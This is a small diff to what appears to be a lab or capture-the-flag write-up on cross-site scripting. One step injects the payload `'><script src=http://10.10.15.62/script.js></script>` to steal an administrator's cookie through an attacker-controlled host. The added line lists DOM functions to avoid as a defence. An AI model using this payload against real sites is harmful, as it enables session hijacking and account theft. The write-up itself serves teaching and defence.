@@ -428,4 +428,5 @@ if (isset($_GET['c'])) {
 ?>`
 
 3. use this payload in the vulnerable parameter `'><script src=http://10.10.15.62/script.js></script>` then in the terminal we will receive an cookie of the admin
-   
+4. we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:
+`DOM.innerHTML, DOM.outerHTML, document.write(), document.writeln(), document.domain`
